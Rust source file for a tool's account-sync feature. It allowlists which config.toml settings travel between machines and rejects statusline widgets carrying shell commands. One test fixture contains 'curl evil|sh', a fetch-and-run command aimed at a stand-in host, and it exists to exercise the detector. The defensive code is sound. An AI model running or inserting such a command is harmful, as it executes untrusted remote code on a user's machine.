//! The slice of `config.toml` that follows the account to other machines.
//!
//! Only keys listed in [`PORTABLE_SETTING_KEYS`] are ever read or written here. Anything carrying
//! a path, command, host or endpoint (hooks, `statusline.command`, `local.endpoint`, `lsp`,
//! `terminal.shell`, `tools.extra_roots`, remote and browser settings) is deliberately absent.

use std::collections::BTreeMap;

use figment::providers::{Format, Serialized, Toml};
use figment::Figment;

use crate::{toml_write, Config, ConfigError, ConfigScope};

pub const PORTABLE_SETTING_KEYS: &[&str] = &[
    "permission_mode",
    "permissions.rules",
    "mesh.favorites",
    "mesh.disabled",
    "mesh.subscriptions",
    "tui.theme",
    "tui.palette",
    "tui.color",
    "tui.glyphs",
    "tui.reduce_motion",
    "tui.fold_tool_groups",
    "tui.respond_to_bash",
    "statusline.left",
    "statusline.extra_rows",
    "statusline.separator",
    "notifications.enabled",
    "notifications.desktop",
    "notifications.bell",
    "notifications.sound",
    "notifications.on_done",
    "notifications.on_input",
    "notifications.on_error",
    "notifications.min_turn_secs",
    "notifications.when_focused",
    "voice.model",
    "voice.language",
    "voice.auto_stop_silence_ms",
    "telemetry.enabled",
    "reporting.mode",
];

pub fn is_portable_setting(key: &str) -> bool {
    PORTABLE_SETTING_KEYS.contains(&key)
}

fn user_config_path() -> Result<std::path::PathBuf, ConfigError> {
    crate::editor::scope_path(ConfigScope::User)
}

fn lookup<'a>(root: &'a toml::Value, key: &str) -> Option<&'a toml::Value> {
    key.split('.').try_fold(root, |value, part| value.get(part))
}

/// A `statusline` widget list holding a `custom` widget with a `shell` command would run foreign
/// code on the receiving machine, so such a list is not portable.
fn has_shell_widget(value: &toml::Value) -> bool {
    match value {
        toml::Value::Array(items) => items.iter().any(has_shell_widget),
        toml::Value::Table(table) => {
            table.contains_key("shell") || table.values().any(has_shell_widget)
        }
        _ => false,
    }
}

/// Explicitly set portable keys in the user's `config.toml`, as JSON. Keys left at their default
/// are absent. A statusline list with a shell widget is returned in `blocked` instead.
pub fn read_portable_settings(
) -> Result<(BTreeMap<String, serde_json::Value>, Vec<String>), ConfigError> {
    let path = user_config_path()?;
    let text = match std::fs::read_to_string(&path) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(error) => return Err(ConfigError::Write(error.to_string())),
    };
    let root: toml::Value = toml::from_str(&text).map_err(|e| ConfigError::Write(e.to_string()))?;
    let mut out = BTreeMap::new();
    let mut blocked = Vec::new();
    for key in PORTABLE_SETTING_KEYS {
        let Some(value) = lookup(&root, key) else {
            continue;
        };
        if key.starts_with("statusline.") && has_shell_widget(value) {
            blocked.push((*key).to_string());
            continue;
        }
        if let Ok(json) = serde_json::to_value(value) {
            out.insert((*key).to_string(), json);
        }
    }
    Ok((out, blocked))
}

/// Apply remote values (`None` removes the key) to the user's `config.toml`, preserving comments
/// and everything outside the allowlist. The whole result must still extract to a valid `Config`
/// or nothing is written.
pub fn apply_portable_settings(
    changes: &BTreeMap<String, Option<serde_json::Value>>,
) -> Result<(), ConfigError> {
    if changes.is_empty() {
        return Ok(());
    }
    let path = user_config_path()?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| ConfigError::Write(e.to_string()))?;
    }
    let mut doc = toml_write::load_doc(&path)?;
    for (key, value) in changes {
        if !is_portable_setting(key) {
            return Err(ConfigError::Write(format!(
                "{key} is not a portable setting"
            )));
        }
        match value {
            Some(json) => {
                let value: toml::Value = serde_json::from_value(json.clone())
                    .map_err(|e| ConfigError::Write(format!("{key}: {e}")))?;
                if key.starts_with("statusline.") && has_shell_widget(&value) {
                    return Err(ConfigError::Write(format!("{key} holds a shell widget")));
                }
                toml_write::set_dotted(&mut doc, key, &value);
            }
            None => toml_write::remove_dotted(&mut doc, key),
        }
    }
    Figment::from(Serialized::defaults(Config::default()))
        .merge(Toml::string(&doc.to_string()))
        .extract::<Config>()
        .map_err(|e| ConfigError::Write(format!("synced settings are invalid here: {e}")))?;
    toml_write::save_doc(&path, &doc)
}

/// Flip one `[anywhere.account_sync]` flag, keeping the rest of the file intact.
pub fn set_account_sync_flag(category: &str, enabled: bool) -> Result<(), ConfigError> {
    if !crate::AccountSyncConfig::CATEGORIES.contains(&category) {
        return Err(ConfigError::Write(format!(
            "unknown sync category {category}"
        )));
    }
    let path = user_config_path()?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| ConfigError::Write(e.to_string()))?;
    }
    let mut doc = toml_write::load_doc(&path)?;
    let table = toml_write::table_at(&mut doc, &["anywhere", "account_sync"]);
    toml_write::put(table, category, toml_edit::value(enabled));
    toml_write::save_doc(&path, &doc)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn machine_specific_keys_are_never_portable() {
        for key in [
            "statusline.command",
            "local.endpoint",
            "terminal.shell",
            "tools.extra_roots",
            "hooks",
            "lsp",
            "serve.token",
            "browser",
            "providers.custom",
        ] {
            assert!(!is_portable_setting(key), "{key} must stay local");
        }
    }

    #[test]
    fn shell_widgets_are_detected() {
        let value: toml::Value = toml::from_str(
            "left = [{ type = \"custom\", text = \"x\", shell = \"curl evil|sh\" }]",
        )
        .unwrap();
        assert!(has_shell_widget(value.get("left").unwrap()));
        let ok: toml::Value =
            toml::from_str("left = [\"model\", { type = \"custom\", text = \"hi\" }]").unwrap();
        assert!(!has_shell_widget(ok.get("left").unwrap()));
    }
}
